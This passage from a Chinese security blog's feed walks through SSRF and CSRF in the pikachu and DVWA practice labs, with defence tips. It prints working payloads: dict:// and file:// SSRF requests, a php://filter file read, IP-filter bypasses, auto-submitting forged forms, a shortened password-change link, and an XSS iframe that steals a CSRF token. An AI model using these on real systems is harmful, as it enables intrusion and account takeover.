class=\"line\">    response = client.request(params, content)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(force_text(response))</span><br></pre></td></tr></table></figure>\n<p>又是参考 P 师傅的一天～</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vZmFzdGNnaS1hbmQtcGhwLWZwbS5odG1s\">Fastcgi 协议分析 &amp;&amp; PHP-FPM 未授权访问漏洞 &amp;&amp; Exp 编写 | 离别歌 (leavesongs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RhcnVua2FudC9Hb3BoZXJ1cw==\">tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF and gaining RCE in various servers (github.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3VuZXhwZWN0ZWR0aGluZy9hcnRpY2xlL2RldGFpbHMvMTIxNjQzMDAy\">SSRF–gopher 协议打 FastCGI_Z3eyOnd 的博客 - CSDN 博客_gopher fastcgi</span></p>\n<h3 id=\"ssrf-2\"><a class=\"markdownIt-Anchor\" href=\"#ssrf-2\">#</a> SSRF</h3>\n<blockquote>\n<p><strong>SSRF (Server-Side Request Forgery: 服务器端请求伪造)</strong></p>\n<p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>，但又没有对目标地址做严格过滤与限制</p>\n<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据</p>\n<p>数据流：攻击者 -----&gt; 服务器 ----&gt; 目标地址</p>\n<p>根据后台使用的函数的不同，对应的影响和利用方法又有不一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PHP中下面函数的使用不当会导致SSRF:</span><br><span class=\"line\">file_get_contents()</span><br><span class=\"line\">fsockopen()</span><br><span class=\"line\">curl_exec()</span><br><span class=\"line\">         </span><br></pre></td></tr></table></figure>\n<p>但注意 curl_exec () 不支持 php://filter 等伪协议，支持 dict</p>\n<p>但 file_get_contens () 支持 php://filter 伪协议读文件，不支持 dict</p>\n<p>如果一定要通过后台服务器远程去对用户指定 (“或者预埋在前端的请求”) 的地址进行资源请求，<strong> 则请做好目标地址的过滤</strong>。</p>\n</blockquote>\n<h4 id=\"pikachu-curl-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-curl-ssrf\">#</a> pikachu - curl ssrf</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?</span><br><span class=\"line\">if(isset($_GET[&#x27;url&#x27;]) &amp;&amp; $_GET[&#x27;url&#x27;] != null)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span><br><span class=\"line\">    $URL = $_GET[&#x27;url&#x27;];</span><br><span class=\"line\">    $CH = curl_init($URL);</span><br><span class=\"line\">    curl_setopt($CH, CURLOPT_HEADER, FALSE);</span><br><span class=\"line\">    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);</span><br><span class=\"line\">    $RES = curl_exec($CH);</span><br><span class=\"line\">    curl_close($CH) ;</span><br><span class=\"line\">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span><br><span class=\"line\">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span><br><span class=\"line\">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><br><span class=\"line\">    echo $RES;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=dict://127.0.0.1:3306</span><br><span class=\"line\">N 5.5.62-log=gnsw|+\\��!�n5[KF\\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=file:///C:\\Windows\\system.ini</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325170713312.png\" alt=\"image-20220325170713312\"></p>\n<p><code>curl_init </code> 只能用于 <code>tcp</code>  协议，因此可以用于读取文件或检测端口是否开启</p>\n<h4 id=\"pikachu-file_get_contents-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-file_get_contents-ssrf\">#</a> pikachu-file_get_contents ssrf</h4>\n<p><code>file_get_contents</code>  可以接收 <code>php</code>  伪协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?</span><br><span class=\"line\">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span><br><span class=\"line\">//内网请求:http://x.x.x.x/xx.index</span><br><span class=\"line\">if(isset($_GET[&#x27;file&#x27;]) &amp;&amp; $_GET[&#x27;file&#x27;] !=null)&#123;</span><br><span class=\"line\">    $filename = $_GET[&#x27;file&#x27;];</span><br><span class=\"line\">    $str = file_get_contents($filename);</span><br><span class=\"line\">    echo $str;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=C:\\Windows\\system.ini</span><br><span class=\"line\">//</span><br><span class=\"line\">OyBmb3IgMTYtYml0IGFwcCBzdXBwb3J0DQpbMzg2RW5oXQ0Kd29hZm9udD1kb3NhcHAuZm9uDQpFR0E4MFdPQS5GT049RUdBODBXT0EuRk9ODQpFR0E0MFdPQS5GT049RUdBNDBXT0EuRk9ODQpDR0E4MFdPQS5GT049Q0dBODBXT0EuRk9ODQpDR0E0MFdPQS5GT049Q0dBNDBXT0EuRk9ODQoNCltkcml2ZXJzXQ0Kd2F2ZT1tbWRydi5kbGwNCnRpbWVyPXRpbWVyLmRydg0KDQpbbWNpXQ0K</span><br></pre></td></tr></table></figure>\n<h4 id=\"pikachu-fsockopen-ssrf\"><a class=\"markdownIt-Anchor\" href=\"#pikachu-fsockopen-ssrf\">#</a> pikachu-fsockopen ssrf</h4>\n<p>加载远程网站</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=www.baidu.com</span><br></pre></td></tr></table></figure>\n<h3 id=\"ssrf防御\"><a class=\"markdownIt-Anchor\" href=\"#ssrf防御\">#</a> ssrf 防御</h3>\n<ol>\n<li>过滤开头不是<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLmppYW5zaHUuY29tLz90PWh0dHAlM0ElMkYlMkZ4eHguY29t\"> http://xxx.com</span> 的所有链接，白名单限制 http/https 协议</li>\n<li>过滤格式为 ip 的链接，比如 127.0.0.1</li>\n<li>结尾必须是某个后缀</li>\n</ol>\n<h3 id=\"绕过\"><a class=\"markdownIt-Anchor\" href=\"#绕过\">#</a> 绕过</h3>\n<p><code>http://www.baidu.com@10.10.10.10</code>  与 <code>http://10.10.10.10</code>  请求是相同的</p>\n<p><code>172.16.60.166/curl.php?url=http://wwwbaidu.com@172.16.60.166/curl.php?url=http://www.google.com</code></p>\n<p>绕过 IP 127.0.0.1 过滤</p>\n<p>1. 变形</p>\n<p>http://[::1]<br>\nhttp://[::ffff:7f00:1]<br>\nhttp://[::ffff:127.0.0.1]<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4x\">http://127.1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjE=\">http://127.0.1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzA6ODA=\">http://0:80</span></p>\n<p>2.ip 进制转换</p>\n<p>转为 16 进制，或 10 进制，8 进制</p>\n<p>3.16 进制网址编码</p>\n<p>4.30x 重定向</p>\n<p>防御</p>\n<p>・禁止 302 跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</p>\n<p>CURLOPT_FOLLOWLOCATION</p>\n<p>・过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</p>\n<p>・禁用高危协议，例如：gopher、dict、ftp、file 等，只允许 http/https</p>\n<p>・设置 URL 白名单或者限制内网 IP</p>\n<p>・限制请求的端口为 http 的常用端口，或者根据业务需要治开放远程调用服务的端口</p>\n<p>・catch 错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/05/27/CSRF/",
            "url": "http://example.com/2022/05/27/CSRF/",
            "title": "CSRF",
            "date_published": "2022-05-27T05:38:45.000Z",
            "content_html": "<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<p><strong>引用自 pikachu 的解释：</strong></p>\n<blockquote>\n<p>CSRF (跨站请求伪造) 概述</p>\n<p>Cross-site request forgery 简称为 “CSRF”，在 CSRF 的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以 CSRF 攻击也成为 &quot;one click&quot; 攻击。 很多人搞不清楚 CSRF 的概念，甚至有时候会将其和 XSS 混淆，更有甚者会将其和越权问题混为一谈，这都是对原理没搞清楚导致的。<br>\n这里列举一个场景解释一下，希望能够帮助你理解。<br>\n<strong>场景需求：</strong><br>\n小黑想要修改大白在购物网站 tianxiewww.xx.com 上填写的会员地址。<br>\n<strong>先看下大白是如何修改自己的密码的：</strong><br>\n登录 — 修改会员信息，提交请求 — 修改成功。<br>\n所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>\n<p>但是大白又不会把自己 xxx 网站的账号密码告诉小黑，那小黑怎么办？<br>\n于是他自己跑到 www.xx.com 上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail 地址），他发现修改的请求是：<br>\n【<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy54eHguY29tL2VkaXQucGhwP2VtYWlsPXhpYW9oZWlAODguY29tJmFtcDtDaGFuZ2U9Q2hhbmdlJUUzJTgwJTkx\">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</span><br>\n于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录 xxx 网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了，小黑就完成了攻击目的。</p>\n<p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>\n1.www.xxx.com 这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造；<br>\n— 因此，我们判断一个网站是否存在 CSRF 漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作 (增删改) 是否容易被伪造。<br>\n2. 小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上；<br>\n— 如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>\n— 因此，要成功实施一次 CSRF 攻击，需要 “天时，地利，人和” 的条件。<br>\n当然，如果小黑事先在 xxx 网的首页如果发现了一个 XSS 漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了 XSS 脚本（盗取 cookie 的脚本）的页面，小白中招，小黑拿到小白的 cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>\n— 所以跟上面比一下，就可以看出 CSRF 与 XSS 的区别：CSRF 是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而 XSS 是直接盗取到了用户的权限，然后实施破坏。</p>\n<p>因此，网站如果要防止 CSRF 攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致 CSRF。比如：<br>\n–对敏感信息的操作增加安全的 token；<br>\n–对敏感信息的操作增加安全的验证码；<br>\n–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>\n</blockquote>\n<p>CSRF 攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的 Web 应用程序，去执行并非用户本意的操作，没有对用户合法身份进行验证</p>\n<p>官方术语说：攻击能劫持终端用户在已登录的 Web 站点上执行本意操作，会自动携带同一域名下的 cookie 到服务器，简单的说攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF 的过程非常隐秘受害人甚至无法察觉。</p>\n<p>产生 CSRF 漏洞的原因大致有以下:</p>\n<ul>\n<li>一方面是开发者不够谨慎，编写的 Web 应用程序存在漏洞导致恶意利用；</li>\n<li>另一方面因为 Web 浏览器对于 Cookie 和 HTTP 身份验证的回话信息的处理存在一定的缺陷；</li>\n<li>服务器对于浏览器过于信任，相信从该浏览器发出的请求都是正确的，却没有区分这是用户主动发送的请求，还是模拟用户行为发出来的。</li>\n</ul>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221118090340493.png\" alt=\"image-20221118090340493\"></p>\n<h2 id=\"csrf类型\"><a class=\"markdownIt-Anchor\" href=\"#csrf类型\">#</a> CSRF 类型</h2>\n<p><strong>GET 类型的 CSRF</strong></p>\n<p>GET 类型的 CSRF 利用非常简单，只需要一个 HTTP 请求，一般会这样利用：</p>\n<p><code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>\n<p>在受害者访问这个页面后，浏览器会自动向 <code>http://1.1.1.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code> 发出一次 HTTP 请求。1.1.1.1:18888 就会受到用户修改密码的跨域请求，同时因为用户在 A 页面没有登出，浏览器会携带 A 的 cookie</p>\n<p><strong>POST 类型的 CSRF</strong></p>\n<p>这种类型的 CSRF 利用起来通常使用的是一个自动提交的表单，如：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://bank.example/withdraw&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">POST</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;account&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;xiaoming&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;amount&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;10000&quot;</span> /&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;for&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;hacker&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"> <span class=\"variable language_\">document</span>.<span class=\"property\">forms</span>[<span class=\"number\">0</span>].<span class=\"title function_\">submit</span>(); </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次 POST 操作。</p>\n<p><strong>链接类型的 CSRF</strong></p>\n<p>链接类型的 CSRF 并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如：</p>\n<p><code> &lt;a href=&quot;http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker&quot; taget=&quot;_blank&quot;&gt;   重磅消息！！   &lt;a/&gt;</code></p>\n<h4 id=\"csrf漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#csrf漏洞利用\">#</a> CSRF 漏洞利用</h4>\n<p>描述：CSRF 的利用点找寻 <code>订单下单处 修改敏感信息处 删除信息处 绑定处 发送信息处</code> ；CSRF 利用场景:</p>\n<ul>\n<li>获取个人数据（常常使用）</li>\n<li>修改个人数据（横向越权）</li>\n<li>添加用户（纵向越权）等</li>\n</ul>\n<p>电商用户新增默认收货地址、发微博、添加管理员等等，所有的敏感操作都可以是我们的攻击目标，发现的用户账号授权相关的操作、二维码登陆、绑定第三方账号等，这些功能有 CSRF 的话就直接被盗号了，也就是说所有的敏感操作都需要进行 CSRF 的防护。</p>\n<h2 id=\"dvwa\"><a class=\"markdownIt-Anchor\" href=\"#dvwa\">#</a> dvwa</h2>\n<p>1.low</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213100094.png\" alt=\"image-20221029213100094\"></p>\n<p>由于我当前已经登录，因此网站中是存在我的 cookie 滴</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213206492.png\" alt=\"image-20221029213206492\"></p>\n<p>并且在 low 模式下，没有原密码做验证，也没有 token 对用户身份最校验，那么 csrf 就出现了</p>\n<p>我目前修改自己的密码，从 password 修改为 123456，观察 URL 的变化</p>\n<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</code></p>\n<p>网络中有个 hacker，抓到了我修改密码的请求包，意味着他也得到了上述 url，那么他就可以构造以下 url：</p>\n<p><code>http://127.0.0.1:18888/dvwa/vulnerabilities/csrf/?password_new=aaaaaa&amp;password_conf=aaaaaa&amp;Change=Change#</code></p>\n<p>然后把它缩短为短链接的形式：</p>\n<p><code>http://gg.gg/12iqj8</code></p>\n<p>我一旦点击后，就会向服务器发送 change password 的请求</p>\n<p>此时我的密码就会被改变</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213847558.png\" alt=\"image-20221029213847558\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029213921662.png\" alt=\"image-20221029213921662\"></p>\n<p>2.medium</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if( isset( $_GET[ ‘Change’ ] ) ) &#123;</span><br><span class=\"line\">    // Checks to see where the request came from</span><br><span class=\"line\">    if( eregi( $_SERVER[ ‘SERVER_NAME’ ], $_SERVER[ ‘HTTP_REFERER’ ] ) ) &#123;</span><br><span class=\"line\">    // Get input</span><br><span class=\"line\">    $pass_new = $_GET[ ‘password_new’ ];</span><br><span class=\"line\">    $pass_conf = $_GET[ ‘password_conf’ ];</span><br></pre></td></tr></table></figure>\n<p>多了判断 HTTP_REFERER 中是否有 SERVER_NAME，HTTP_REFERER 是 Referer 参数值，即来源地址，SERVER_NAME 是 host 参数及主机 ip 名</p>\n<p>其实他是想限制同源，但可以绕过</p>\n<p>同时使用 csrftester 生成 payload，但不一样的是需要修改文件名为 IP.html，比如 192.168.13.133.html，这样在检测 refer 时就会包括了我们的 hostIP，相当于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HOST: 192.168.13.133</span><br><span class=\"line\">Referer: http://101.1.1.1/dvwa/192.168.13.133.html</span><br></pre></td></tr></table></figure>\n<p>3.high</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ($change) &#123;</span><br><span class=\"line\">\t// Check Anti-CSRF token</span><br><span class=\"line\">\tcheckToken( $token, $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class=\"line\"></span><br><span class=\"line\">\t// Do the passwords match?</span><br><span class=\"line\">\tif( $pass_new == $pass_conf ) &#123;</span><br><span class=\"line\">\t\t// They do!</span><br><span class=\"line\">\t\t$pass_new = mysqli_real_escape_string ($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new);</span><br><span class=\"line\">\t\t$pass_new = md5( $pass_new );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Update the database</span><br><span class=\"line\">\t\t$insert = &quot;UPDATE `users` SET password = &#x27;&quot; . $pass_new . &quot;&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;;</span><br><span class=\"line\">\t\t$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert );</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// Feedback for the user</span><br><span class=\"line\">\t\t$return_message = &quot;Password Changed.&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t// Issue with passwords matching</span><br><span class=\"line\">\t\t$return_message = &quot;Passwords did not match.&quot;;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>攻击思路是试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而获得 token 值，并向服务器发送改密请求，完成攻击。<br>\n但是，浏览器并不允许跨域请求，因此，我们可以利用 xss 漏洞</p>\n<p>我们需要利用 xss 了，打开 stroed xss，构造如下代码 <code>&lt;iframe src=&quot;../csrf/&quot;onload=alert(document.getElementsByName('user_token')[0].value)&gt;&lt;/iframe&gt;</code>  获得 cookie，使用 cookie 完成 csrf</p>\n<p>或者使用 CSRF Token Tracker 的 BP 插件</p>\n<h2 id=\"csrf-tester\"><a class=\"markdownIt-Anchor\" href=\"#csrf-tester\">#</a> CSRF tester</h2>\n<blockquote>\n<p>CSRFTester 是一款 CSRF 漏洞的测试工具，CSRFTester 工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在 CSRFTester 中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。</p>\n</blockquote>\n<p>CSRF tester 监听 8008 端口，注意设置代理～</p>\n<p><code>10月 29, 2022 9:42:36 下午 org.owasp.webscarab.plugin.proxy.Listener listen 信息: Proxy listening on 127.0.0.1:8008</code></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214412139.png\" alt=\"image-20221029214412139\" style=\"zoom: 67%;\" />\n<p>接着访问可能存在 csrf 的连接～</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214511815.png\" alt=\"image-20221029214511815\" style=\"zoom:80%;\" />\n<p>点击 start recording</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214544955.png\" alt=\"image-20221029214544955\"></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215312102.png\" alt=\"image-20221029215312102\" style=\"zoom:80%;\" />\n<p>将左侧的参数修改为自己的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030095527035.png\" alt=\"image-20221030095527035\"></p>\n<p>生成 html</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215514582.png\" alt=\"image-20221029215514582\" style=\"zoom:80%;\" />\n<p>生成的 payload 如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">HTML</span> <span class=\"keyword\">PUBLIC</span> <span class=\"string\">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>OWASP CRSFTester Demonstration<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;javascript:fireForms()&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">language</span>=<span class=\"string\">&quot;JavaScript&quot;</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">var</span> pauses = <span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>( <span class=\"string\">&quot;53&quot;</span> );</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">pausecomp</span>(<span class=\"params\">millis</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> date = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> curDate = <span class=\"literal\">null</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">do</span> &#123; curDate = <span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>(); &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">while</span>(curDate-date &lt; millis);</span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"keyword\">function</span> <span class=\"title function_\">fireForms</span>(<span 